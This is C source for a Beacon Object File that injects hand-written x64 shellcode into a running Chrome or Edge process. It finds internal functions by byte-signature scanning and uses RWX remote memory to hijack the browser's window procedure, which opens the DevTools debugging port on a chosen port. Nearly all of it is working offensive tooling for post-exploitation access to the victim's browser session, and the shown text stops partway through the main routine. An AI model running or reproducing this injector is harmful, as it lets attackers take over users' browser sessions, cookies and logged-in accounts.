/*
 * CDP-Enabler-BOF
 *
 * Self-resolving BOF that enables CDP in a running Edge or Chrome instance
 * without relying on hardcoded RVAs. Installs a temporary remote WndProc 
 * so StartRemoteDebuggingServer runs on the browser UI thread.
 *
 * Arguments:
 *   <browser> <port>
 *     browser = "edge" or "chrome"
 *     port    = integer 9000-65535
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <stdint.h>

#include "beacon.h"

WINBASEAPI HANDLE  WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL    WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL    WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL    WINAPI KERNEL32$Module32FirstW(HANDLE, LPMODULEENTRY32W);
WINBASEAPI BOOL    WINAPI KERNEL32$Module32NextW(HANDLE, LPMODULEENTRY32W);
WINBASEAPI HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINBASEAPI BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI LPVOID  WINAPI KERNEL32$VirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL    WINAPI KERNEL32$VirtualFreeEx(HANDLE, LPVOID, SIZE_T, DWORD);
WINBASEAPI BOOL    WINAPI KERNEL32$WriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WINBASEAPI BOOL    WINAPI KERNEL32$ReadProcessMemory(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
WINBASEAPI HANDLE  WINAPI KERNEL32$CreateRemoteThread(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
WINBASEAPI DWORD   WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
WINBASEAPI BOOL    WINAPI KERNEL32$GetExitCodeThread(HANDLE, LPDWORD);
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(void);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW(LPCWSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
WINBASEAPI VOID    WINAPI KERNEL32$GetSystemInfo(LPSYSTEM_INFO);

WINUSERAPI HWND    WINAPI USER32$FindWindowA(LPCSTR, LPCSTR);
WINUSERAPI HWND    WINAPI USER32$FindWindowExA(HWND, HWND, LPCSTR, LPCSTR);
WINUSERAPI DWORD   WINAPI USER32$GetWindowThreadProcessId(HWND, LPDWORD);
WINUSERAPI HWND    WINAPI USER32$GetParent(HWND);
WINUSERAPI BOOL    WINAPI USER32$IsWindowVisible(HWND);
WINUSERAPI LRESULT WINAPI USER32$SendMessageA(HWND, UINT, WPARAM, LPARAM);

WINBASEAPI int     __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);

#define CreateToolhelp32Snapshot KERNEL32$CreateToolhelp32Snapshot
#define Process32FirstW          KERNEL32$Process32FirstW
#define Process32NextW           KERNEL32$Process32NextW
#define Module32FirstW           KERNEL32$Module32FirstW
#define Module32NextW            KERNEL32$Module32NextW
#define OpenProcess              KERNEL32$OpenProcess
#define CloseHandle              KERNEL32$CloseHandle
#define VirtualAllocEx           KERNEL32$VirtualAllocEx
#define VirtualFreeEx            KERNEL32$VirtualFreeEx
#define WriteProcessMemory       KERNEL32$WriteProcessMemory
#define ReadProcessMemory        KERNEL32$ReadProcessMemory
#define CreateRemoteThread       KERNEL32$CreateRemoteThread
#define WaitForSingleObject      KERNEL32$WaitForSingleObject
#define GetExitCodeThread        KERNEL32$GetExitCodeThread
#define GetLastError             KERNEL32$GetLastError
#define GetProcessHeap           KERNEL32$GetProcessHeap
#define HeapAlloc                KERNEL32$HeapAlloc
#define HeapFree                 KERNEL32$HeapFree
#define GetModuleHandleW         KERNEL32$GetModuleHandleW
#define LoadLibraryW             KERNEL32$LoadLibraryW
#define GetProcAddress           KERNEL32$GetProcAddress
#define GetSystemInfo            KERNEL32$GetSystemInfo
#define FindWindowA              USER32$FindWindowA
#define FindWindowExA            USER32$FindWindowExA
#define GetWindowThreadProcessId USER32$GetWindowThreadProcessId
#define GetParent                USER32$GetParent
#define IsWindowVisible          USER32$IsWindowVisible
#define SendMessageA             USER32$SendMessageA
#define lstrcmpiW                MSVCRT$_wcsicmp

#define WM_START_CDP_REMOTE (WM_USER + 0x2451)

typedef struct {
    UINT64 hwnd;
    UINT64 new_wndproc;
    UINT64 set_window_long_ptr_a;
    UINT64 old_wndproc;
} INSTALL_CTX;

typedef struct {
    UINT64 old_wndproc;
    UINT64 set_window_long_ptr_a;
    UINT64 start_remote_debugging_server;
    UINT64 chrome_new;
    UINT64 factory_vtable;
    UINT32 port;
    UINT32 mode;
} WNDPROC_CTX;

typedef struct {
    const char* browser_name;
    const wchar_t* process_name;
    const wchar_t* module_name_w;
    const uint8_t* start_sig;
    const uint8_t* start_mask;
    size_t start_sig_len;
    const uint8_t* entry1_sig;
    const uint8_t* entry1_mask;
    size_t entry1_sig_len;
} TARGET_CFG;

static const unsigned char INSTALL_STUB[] = {
    0x53,
    0x48, 0x83, 0xEC, 0x20,
    0x48, 0x89, 0xCB,
    0x48, 0x8B, 0x0B,
    0x48, 0xC7, 0xC2, 0xFC, 0xFF, 0xFF, 0xFF,
    0x4C, 0x8B, 0x43, 0x08,
    0x48, 0x8B, 0x43, 0x10,
    0xFF, 0xD0,
    0x48, 0x89, 0x43, 0x18,
    0x31, 0xC0,
    0x48, 0x83, 0xC4, 0x20,
    0x5B,
    0xC3
};

static const unsigned char WNDPROC_STUB_TEMPLATE[] = {
    0x53,
    0x48, 0x83, 0xEC, 0x70,
    0x48, 0xBB,
    0,0,0,0,0,0,0,0,
    0x48, 0xC7, 0xC2, 0xFC, 0xFF, 0xFF, 0xFF,
    0x4C, 0x8B, 0x03,
    0x48, 0x8B, 0x43, 0x08,
    0xFF, 0xD0,
    0x48, 0xC7, 0xC1, 0x10, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x43, 0x18,
    0xFF, 0xD0,
    0x48, 0x89, 0x44, 0x24, 0x20,
    0x31, 0xC9,
    0x48, 0x89, 0x48, 0x08,
    0x48, 0x8B, 0x4B, 0x20,
    0x48, 0x89, 0x08,
    0x66, 0x8B, 0x4B, 0x28,
    0x66, 0x89, 0x48, 0x08,
    0x31, 0xC9,
    0x48, 0x89, 0x4C, 0x24, 0x28,
    0x48, 0x89, 0x4C, 0x24, 0x30,
    0x48, 0x89, 0x4C, 0x24, 0x38,
    0x48, 0x89, 0x4C, 0x24, 0x40,
    0x48, 0x89, 0x4C, 0x24, 0x48,
    0x48, 0x89, 0x4C, 0x24, 0x50,
    0x48, 0x8D, 0x4C, 0x24, 0x20,
    0x48, 0x8D, 0x54, 0x24, 0x28,
    0x4C, 0x8D, 0x44, 0x24, 0x40,
    0x44, 0x8B, 0x4B, 0x2C,
    0x48, 0x8B, 0x43, 0x10,
    0xFF, 0xD0,
    0x31, 0xC0,
    0x48, 0x83, 0xC4, 0x70,
    0x5B,
    0xC3
};

static const uint8_t EDGE_START_SIG[] = {
    0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57,
    0x55, 0x53, 0x48, 0x83, 0xEC, 0x50,
    0x44, 0x89, 0xCD, 0x4C, 0x89, 0xC3,
    0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE,
    0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x48,
    0xE8, 0x00, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0x70, 0x08, 0x4D, 0x85, 0xF6, 0x0F, 0x84,
    0x00, 0x00, 0x00, 0x00,
    0xB9, 0x90, 0x00, 0x00, 0x00
};

static const uint8_t EDGE_START_MASK[] = {
    1,1,1,1,1,1,1,1,
    1,1,1,1,1,1,
    1,1,1,1,1,1,
    1,1,1,1,1,1,
    1,1,1,0,0,0,0,
    1,1,1,1,1,1,1,1,
    1,0,0,0,0,
    1,1,1,1,1,1,1,1,1,
    0,0,0,0,
    1,1,1,1,1
};

static const uint8_t CHROME_START_SIG[] = {
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53,
    0x48, 0x83, 0xEC, 0x48,
    0x44, 0x89, 0xCD, 0x4D, 0x89, 0xC6,
    0x48, 0x89, 0xD3, 0x48, 0x89, 0xCE,
    0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x40, 0xE8,
    0x00, 0x00, 0x00, 0x00,
    0x4C, 0x8B, 0x78, 0x08, 0x4D, 0x85, 0xFF, 0x0F, 0x84,
    0xE8, 0x00, 0x00, 0x00,
    0xB9, 0x90, 0x00, 0x00, 0x00
};

static const uint8_t CHROME_START_MASK[] = {
    1,1,1,1,1,1,1,1,
    1,1,1,1,
    1,1,1,1,1,1,
    1,1,1,1,1,1,
    1,1,1,0,0,0,0,
    1,1,1,1,1,1,1,1,1,
    0,0,0,0,
    1,1,1,1,1,1,1,1,1,
    1,1,1,1,
    1,1,1,1,1
};

/* Short unique operator new signature. */
static const uint8_t OPERATOR_NEW_SIG[] = {
    0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xEB
};
static const uint8_t OPERATOR_NEW_MASK[] = {
    1,1,1,1,1,1,1,1,1,1
};

static const uint8_t VTABLE_ENTRY0_SIG[] = {
    0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE,
    0xF6, 0xC2, 0x01, 0x74, 0x08, 0x48, 0x89, 0xF1,
    0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF0,
    0x48, 0x83, 0xC4, 0x20, 0x5E, 0xC3
};
static const uint8_t VTABLE_ENTRY0_MASK[] = {
    1,1,1,1,1,1,1,1,
    1,1,1,1,1,1,1,1,
    1,0,0,0,0,1,1,1,
    1,1,1,1,1,1
};

/* Edge and Chrome each get their known-unique CreateForHttpServer signature. */
static const uint8_t EDGE_ENTRY1_SIG[] = {
    0x48, 0x89, 0xD0, 0x0F, 0xB7, 0x51, 0x08, 0x48
};

static const uint8_t CHROME_ENTRY1_SIG[] = {
    0x41, 0x57, 0x41, 0x56, 0x56, 0x57, 0x55, 0x53,
    0x48, 0x81, 0xEC, 0x88, 0x00, 0x00, 0x00,
    0x48, 0x89, 0xD6, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xE0, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00,
    0x0F, 0xB7, 0x59, 0x08, 0xB9, 0x38, 0x00, 0x00, 0x00,
    0xE8, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x89, 0xC7, 0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t CHROME_ENTRY1_MASK[] = {
    1,1,1,1,1,1,1,1,
    1,1,1,1,1,1,1,
    1,1,1,1,1,1,0,0,0,0,
    1,1,1,1,1,1,1,1,1,1,1,
    1,1,1,1,1,1,1,1,1,
    1,0,0,0,0,
    1,1,1,1,1,1,0,0,0,0,
    1,1,1,0,0,0,0
};

static void bof_memcpy(void* dst, const void* src, SIZE_T len) {
    SIZE_T i;
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    for (i = 0; i < len; i++) d[i] = s[i];
}

static void bof_memset(void* dst, int c, SIZE_T len) {
    SIZE_T i;
    unsigned char* d = (unsigned char*)dst;
    for (i = 0; i < len; i++) d[i] = (unsigned char)c;
}

static void PatchQword(unsigned char* buf, SIZE_T off, UINT64 value) {
    bof_memcpy(buf + off, &value, sizeof(value));
}

static int ascii_equals_literal(const char* s, int len, const char* lit) {
    int i = 0;
    if (!s || !lit) return 0;
    while (i < len && s[i] && lit[i]) {
        if (s[i] != lit[i]) return 0;
        i++;
    }
    if (lit[i] != 0) return 0;
    if (i < len && s[i] != 0) return 0;
    return 1;
}

static BOOL IsBrowserProcess(DWORD pid) {
    HWND hwnd = FindWindowA("Chrome_WidgetWin_1", NULL);
    while (hwnd) {
        DWORD window_pid = 0;
        GetWindowThreadProcessId(hwnd, &window_pid);
        if (window_pid == pid && GetParent(hwnd) == NULL && IsWindowVisible(hwnd)) {
            return TRUE;
        }
        hwnd = FindWindowExA(NULL, hwnd, "Chrome_WidgetWin_1", NULL);
    }
    return FALSE;
}

static DWORD FindBrowserProcess(const wchar_t* target_proc_name) {
    HANDLE hSnapshot;
    PROCESSENTRY32W pe;
    DWORD browser_pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    bof_memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, target_proc_name) == 0) {
                if (IsBrowserProcess(pe.th32ProcessID)) {
                    browser_pid = pe.th32ProcessID;
                    break;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return browser_pid;
}

static HWND FindBrowserWindowForPid(DWORD pid) {
    HWND hwnd = FindWindowA("Chrome_WidgetWin_1", NULL);
    while (hwnd) {
        DWORD window_pid = 0;
        GetWindowThreadProcessId(hwnd, &window_pid);
        if (window_pid == pid && GetParent(hwnd) == NULL && IsWindowVisible(hwnd)) {
            return hwnd;
        }
        hwnd = FindWindowExA(NULL, hwnd, "Chrome_WidgetWin_1", NULL);
    }
    return NULL;
}

static BOOL GetRemoteModule(DWORD pid, const wchar_t* module_name, uintptr_t* base_out, DWORD* size_out) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    MODULEENTRY32W me;
    BOOL ok = FALSE;

    if (snap == INVALID_HANDLE_VALUE) return FALSE;
    bof_memset(&me, 0, sizeof(me));
    me.dwSize = sizeof(me);
    if (Module32FirstW(snap, &me)) {
        do {
            if (lstrcmpiW(me.szModule, module_name) == 0) {
                *base_out = (uintptr_t)me.modBaseAddr;
                *size_out = me.modBaseSize;
                ok = TRUE;
                break;
            }
        } while (Module32NextW(snap, &me));
    }
    CloseHandle(snap);
    return ok;
}

static BOOL GetRemoteSystemProc(DWORD pid, const wchar_t* module_name, const char* proc_name, uintptr_t* out_addr) {
    HMODULE local_mod = GetModuleHandleW(module_name);
    FARPROC local_proc;
    uintptr_t local_rva;
    uintptr_t remote_base;
    DWORD remote_size;

    if (!local_mod) local_mod = LoadLibraryW(module_name);
    if (!local_mod) return FALSE;
    local_proc = GetProcAddress(local_mod, proc_name);
    if (!local_proc) return FALSE;
    local_rva = (uintptr_t)local_proc - (uintptr_t)local_mod;
    if (!GetRemoteModule(pid, module_name, &remote_base, &remote_size)) return FALSE;
    *out_addr = remote_base + local_rva;
    return TRUE;
}

static BOOL GetRemoteSectionInfo(HANDLE hProcess, uint8_t* module_base,
                                 uint8_t** text_base, SIZE_T* text_size,
                                 uint8_t** rdata_base, SIZE_T* rdata_size) {
    IMAGE_DOS_HEADER dos;
    IMAGE_NT_HEADERS64 nt;
    IMAGE_SECTION_HEADER section;
    SIZE_T read = 0;
    DWORD i;
    uint8_t* section_hdr;

    if (!ReadProcessMemory(hProcess, module_base, &dos, sizeof(dos), &read) || read != sizeof(dos))
        return FALSE;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    if (!ReadProcessMemory(hProcess, module_base + dos.e_lfanew, &nt, sizeof(nt), &read) || read != sizeof(nt))
        return FALSE;
    if (nt.Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    section_hdr = module_base + dos.e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    *text_base = NULL;
    *rdata_base = NULL;

    for (i = 0; i < nt.FileHeader.NumberOfSections; i++) {
        if (!ReadProcessMemory(hProcess, section_hdr + (i * sizeof(IMAGE_SECTION_HEADER)),
                               &section, sizeof(section), &read) || read != sizeof(section))
            continue;

        if (section.Name[0] == '.' && section.Name[1] == 't' && section.Name[2] == 'e' &&
            section.Name[3] == 'x' && section.Name[4] == 't') {
            *text_base = module_base + section.VirtualAddress;
            *text_size = section.Misc.VirtualSize;
        } else if (section.Name[0] == '.' && section.Name[1] == 'r' && section.Name[2] == 'd' &&
                   section.Name[3] == 'a' && section.Name[4] == 't' && section.Name[5] == 'a') {
            *rdata_base = module_base + section.VirtualAddress;
            *rdata_size = section.Misc.VirtualSize;
        }
    }

    return (*text_base != NULL && *rdata_base != NULL);
}

static void* ScanRemoteForSignature(HANDLE hProcess, uint8_t* start, SIZE_T size,
                                    const uint8_t* sig, const uint8_t* mask, SIZE_T sig_len) {
    const SIZE_T chunk = 0x10000;
    SIZE_T offset = 0;
    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk + sig_len);
    if (!buf) return NULL;

    while (offset < size) {
        SIZE_T to_read = size - offset;
        SIZE_T read = 0, end, i;
        if (to_read > chunk) to_read = chunk;

        if (!ReadProcessMemory(hProcess, start + offset, buf, to_read, &read) || read < sig_len) {
            offset += chunk;
            continue;
        }

        end = read - sig_len;
        for (i = 0; i <= end; i++) {
            BOOL match = TRUE;
            SIZE_T j;
            for (j = 0; j < sig_len && match; j++) {
                if (!mask || mask[j]) {
                    if (buf[i + j] != sig[j]) match = FALSE;
                }
            }
            if (match) {
                void* found = start + offset + i;
                HeapFree(GetProcessHeap(), 0, buf);
                return found;
            }
        }
        offset += chunk;
    }

    HeapFree(GetProcessHeap(), 0, buf);
    return NULL;
}

static int CountRemoteSignatureHits(HANDLE hProcess, uint8_t* start, SIZE_T size,
                                    const uint8_t* sig, const uint8_t* mask, SIZE_T sig_len,
                                    uintptr_t* first_hit) {
    const SIZE_T chunk = 0x10000;
    SIZE_T offset = 0;
    int count = 0;
    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk + sig_len);
    if (!buf) return 0;

    if (first_hit) *first_hit = 0;

    while (offset < size) {
        SIZE_T to_read = size - offset;
        SIZE_T read = 0, end, i;
        if (to_read > chunk) to_read = chunk;

        if (!ReadProcessMemory(hProcess, start + offset, buf, to_read, &read) || read < sig_len) {
            offset += chunk;
            continue;
        }

        end = read - sig_len;
        for (i = 0; i <= end; i++) {
            BOOL match = TRUE;
            SIZE_T j;
            for (j = 0; j < sig_len && match; j++) {
                if (!mask || mask[j]) {
                    if (buf[i + j] != sig[j]) match = FALSE;
                }
            }
            if (match) {
                if (count == 0 && first_hit) {
                    *first_hit = (uintptr_t)(start + offset + i);
                }
                count++;
            }
        }
        offset += chunk;
    }

    HeapFree(GetProcessHeap(), 0, buf);
    return count;
}

static int ScanRemoteForAllSignatures(HANDLE hProcess, uint8_t* start, SIZE_T size,
                                      const uint8_t* sig, const uint8_t* mask, SIZE_T sig_len,
                                      uint64_t* out_matches, int max_matches) {
    const SIZE_T chunk = 0x10000;
    SIZE_T offset = 0;
    int count = 0;
    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk + sig_len);
    if (!buf) return 0;

    while (offset < size && count < max_matches) {
        SIZE_T to_read = size - offset;
        SIZE_T read = 0, end, i;
        if (to_read > chunk) to_read = chunk;

        if (!ReadProcessMemory(hProcess, start + offset, buf, to_read, &read) || read < sig_len) {
            offset += chunk;
            continue;
        }

        end = read - sig_len;
        for (i = 0; i <= end && count < max_matches; i++) {
            BOOL match = TRUE;
            SIZE_T j;
            for (j = 0; j < sig_len && match; j++) {
                if (!mask || mask[j]) {
                    if (buf[i + j] != sig[j]) match = FALSE;
                }
            }
            if (match) {
                out_matches[count++] = (uint64_t)(uintptr_t)(start + offset + i);
            }
        }
        offset += chunk;
    }

    HeapFree(GetProcessHeap(), 0, buf);
    return count;
}

static void* FindVtableInRdata(HANDLE hProcess, uint8_t* rdata_base, SIZE_T rdata_size,
                               uint64_t* destr_addrs, int destr_count, uint64_t entry1_addr,
                               uint8_t* text_base, SIZE_T text_size) {
    const SIZE_T chunk = 0x10000;
    SIZE_T offset = 0;
    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk);
    if (!buf) return NULL;

    while (offset < rdata_size) {
        SIZE_T to_read = rdata_size - offset;
        SIZE_T read = 0, end, i;
        if (to_read > chunk) to_read = chunk;

        if (!ReadProcessMemory(hProcess, rdata_base + offset, buf, to_read, &read) || read < 16) {
            offset += chunk;
            continue;
        }

        end = (read >= 16) ? (read - 16) : 0;
        for (i = 0; i <= end; i += 8) {
            uint64_t first = *(uint64_t*)(buf + i);
            uint64_t second = *(uint64_t*)(buf + i + 8);
            if (second == entry1_addr && destr_count > 0) {
                int di;
                for (di = 0; di < destr_count; di++) {
                    if (first == destr_addrs[di]) {
                        void* found = rdata_base + offset + i;
                        HeapFree(GetProcessHeap(), 0, buf);
                        return found;
                    }
                }
            }
        }
        offset += chunk;
    }

    if (destr_count <= 0) {
        int hits = 0;
        void* candidate = NULL;

        offset = 0;
        while (offset < rdata_size) {
            SIZE_T to_read = rdata_size - offset;
            SIZE_T read = 0, end, i;
            if (to_read > chunk) to_read = chunk;

            if (!ReadProcessMemory(hProcess, rdata_base + offset, buf, to_read, &read) || read < 16) {
                offset += chunk;
                continue;
            }

            end = (read >= 16) ? (read - 16) : 0;
            for (i = 0; i <= end; i += 8) {
                uint64_t first = *(uint64_t*)(buf + i);
                uint64_t second = *(uint64_t*)(buf + i + 8);
                if (second == entry1_addr &&
                    first >= (uint64_t)text_base &&
                    first < (uint64_t)(text_base + text_size)) {
                    hits++;
                    candidate = rdata_base + offset + i;
                    if (hits > 1) break;
                }
            }
            if (hits > 1) break;
            offset += chunk;
        }

        if (hits == 1) {
            HeapFree(GetProcessHeap(), 0, buf);
            return candidate;
        }
    }

    HeapFree(GetProcessHeap(), 0, buf);
    return NULL;
}

static BOOL ResolveSymbolsRuntime(HANDLE hProcess, uintptr_t module_base, const TARGET_CFG* target,
                                  uintptr_t* start_server, uintptr_t* chrome_new, uintptr_t* factory_vtable) {
    uint8_t* text_base = NULL;
    uint8_t* rdata_base = NULL;
    SIZE_T text_size = 0, rdata_size = 0;
    void* entry1 = NULL;
    uint64_t destr_addrs[32];
    int destr_count = 0;
    int start_hits = 0;

    if (!GetRemoteSectionInfo(hProcess, (uint8_t*)module_base, &text_base, &text_size, &rdata_base, &rdata_size)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read remote PE sections");
        return FALSE;
    }

    start_hits = CountRemoteSignatureHits(
        hProcess, text_base, text_size, target->start_sig, target->start_mask, target->start_sig_len, start_server);
    if (start_hits == 0 || !*start_server) {
        BeaconPrintf(CALLBACK_ERROR, "[-] StartRemoteDebuggingServer signature not found");
        return FALSE;
    }
    if (start_hits != 1) {
        BeaconPrintf(CALLBACK_ERROR, "[-] StartRemoteDebuggingServer signature was not unique (hits=%d)", start_hits);
        return FALSE;
    }

    *chrome_new = (uintptr_t)ScanRemoteForSignature(hProcess, text_base, text_size, OPERATOR_NEW_SIG, OPERATOR_NEW_MASK, sizeof(OPERATOR_NEW_SIG));
    if (!*chrome_new) {
        BeaconPrintf(CALLBACK_ERROR, "[-] operator new signature not found");
        return FALSE;
    }

    entry1 = ScanRemoteForSignature(hProcess, text_base, text_size, target->entry1_sig, target->entry1_mask, target->entry1_sig_len);
    if (!entry1) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateForHttpServer signature not found");
        return FALSE;
    }

    destr_count = ScanRemoteForAllSignatures(
        hProcess, text_base, text_size, VTABLE_ENTRY0_SIG, VTABLE_ENTRY0_MASK, sizeof(VTABLE_ENTRY0_SIG),
        destr_addrs, 32);

    *factory_vtable = (uintptr_t)FindVtableInRdata(
        hProcess, rdata_base, rdata_size, destr_addrs, destr_count, (uint64_t)(uintptr_t)entry1,
        text_base, text_size);
    if (!*factory_vtable) {
        BeaconPrintf(CALLBACK_ERROR, "[-] TCPServerSocketFactory vtable not found");
        return FALSE;
    }

    return TRUE;
}

void go(char* args, int len) {
    TARGET_CFG targets[] = {
        { "edge", L"msedge.exe", L"msedge.dll", EDGE_START_SIG, EDGE_START_MASK, sizeof(EDGE_START_SIG), EDGE_ENTRY1_SIG, NULL, sizeof(EDGE_ENTRY1_SIG) },
        { "chrome", L"chrome.exe", L"chrome.dll", CHROME_START_SIG, CHROME_START_MASK, sizeof(CHROME_START_SIG), CHROME_ENTRY1_SIG, CHROME_ENTRY1_MASK, sizeof(CHROME_ENTRY1_SIG) }
    };
    datap parser;
    TARGET_CFG* target = NULL;
    DWORD pid = 0;
    HWND hwnd;
    uintptr_t browser_base = 0;
    DWORD browser_size = 0;
    HANDLE hProcess = NULL;
    LPVOID remote_mem = NULL;
    SIZE_T total_size = 0x1000;
    unsigned char* local_page = NULL;
    SIZE_T written = 0;
    HANDLE hThread = NULL;
    INSTALL_CTX install_ctx;
    WNDPROC_CTX wnd_ctx;
    uintptr_t set_window_long_ptr_a = 0;
    uintptr_t install_stub_remote, wnd_stub_remote, install_ctx_remote, wnd_ctx_remote;
    uintptr_t start_server = 0, chrome_new = 0, factory_vtable = 0;
    DWORD exit_code = 0;
    int port = 0;
    int ti;
    char* browser_arg = NULL;
    int browser_len = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "=== CDP-Enabler-BOF ===");

    if (len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing required arguments. Expected: <chrome|edge> <port>");
        return;
    }

    BeaconDataParse(&parser, args, len);
    browser_arg = BeaconDataExtract(&parser, &browser_len);
    if (!browser_arg || browser_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing required browser argument. Expected: <chrome|edge>");
        return;
    }

    if (BeaconDataLength(&parser) < 4) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing required port argument.");
        return;
    }
    port = BeaconDataInt(&parser);
    if (port <= 8999 || port > 65535) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid port: %d", port);
        return;
    }

    for (ti = 0; ti < (int)(sizeof(targets)/sizeof(targets[0])); ti++) {
        if (ascii_equals_literal(browser_arg, browser_len, targets[ti].browser_name)) {
            target = &targets[ti];
            break;
        }
    }
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid browser argument. Expected 'chrome' or 'edge'.");
        return;
    }

    pid = FindBrowserProcess(target->process_name);
    if (!pid) {
        BeaconPrintf(CALLBACK_ERROR, "[-] %ls browser process was not found", target->process_name);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Target = %ls, PID %lu", target->process_name, (unsigned long)pid);

    hwnd = FindBrowserWindowForPid(pid);
    if (!hwnd) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not find top-level browser window");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Browser window 0x%p", hwnd);

    if (!GetRemoteModule(pid, target->module_name_w, &browser_base, &browser_size)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not locate target DLL in browser");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %ls base = 0x%p", target->module_name_w, (void*)browser_base);

    if (!GetRemoteSystemProc(pid, L"user32.dll", "SetWindowLongPtrA", &set_window_long_ptr_a)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not resolve remote SetWindowLongPtrA");
        return;
    }

    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                           PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                           FALSE, pid);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess failed: %lu", (unsigned long)GetLastError());
        return;
    }

    if (!ResolveSymbolsRuntime(hProcess, browser_base, target, &start_server, &chrome_new, &factory_vtable)) {
        CloseHandle(hProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] StartRemoteDebuggingServer = 0x%p", (void*)start_server);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] operator new = 0x%p", (void*)chrome_new);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] factory vtable = 0x%p", (void*)factory_vtable);

    remote_mem = VirtualAllocEx(hProcess, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAllocEx failed: %lu", (unsigned long)GetLastError());
        CloseHandle(hProcess);
        return;
    }

    local_page = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, total_size);
    if (!local_page) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed");
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    bof_memset(&install_ctx, 0, sizeof(install_ctx));
    bof_memset(&wnd_ctx, 0, sizeof(wnd_ctx));
    bof_memset(local_page, 0, total_size);

